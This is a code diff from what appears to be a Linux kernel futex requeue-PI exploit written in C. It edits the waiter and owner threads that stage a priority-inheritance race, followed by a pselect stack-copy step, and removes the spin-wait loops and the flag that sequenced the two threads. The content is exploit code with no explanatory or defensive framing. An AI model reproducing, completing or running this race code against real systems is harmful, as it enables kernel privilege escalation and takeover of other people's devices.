@@ -26,7 +26,6 @@ static uint32_t slide_f_pi_chain;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
-static atomic_int slide_waiter_queued;
 static atomic_int slide_owner_acquired;
 static atomic_int slide_deadlock_seen;
 static atomic_int slide_waiter_ok;
@@ -688,7 +687,6 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   pr_info("slide waiter f_wait=%u f_pi_target=%u f_pi_chain=%u\n",
           slide_f_wait, slide_f_pi_target, slide_f_pi_chain);
   slide_f_wait = 0;
-  atomic_store(&slide_waiter_queued, 1);
   errno = 0;
   long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                            &slide_f_pi_target, 0);
@@ -699,18 +697,11 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
   atomic_store(&slide_waiter_ok, 1);
-  while (!atomic_load(&slide_deadlock_seen)) {
-    __asm__ volatile("yield" ::: "memory");
-  }
   if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter unlock chain errno=%d\n", errno);
     atomic_store(&slide_route_done, 1);
     return NULL;
   }
-  while (!atomic_load(&slide_owner_acquired)) {
-    __asm__ volatile("yield" ::: "memory");
-  }
-
   slide_pselect_stack_copy();
   atomic_store(&slide_route_done, 1);
 
@@ -720,10 +711,6 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
-  while (!atomic_load(&slide_waiter_waiting)) {
-    usleep(100);
-  }
-
   if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide owner lock target errno=%d\n", errno);
     return NULL;
@@ -736,10 +723,6 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_owner_started, 1);
-
-  while (!atomic_load(&slide_waiter_queued)) {
-    usleep(100);
-  }
 
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide owner lock chain errno=%d\n", errno);
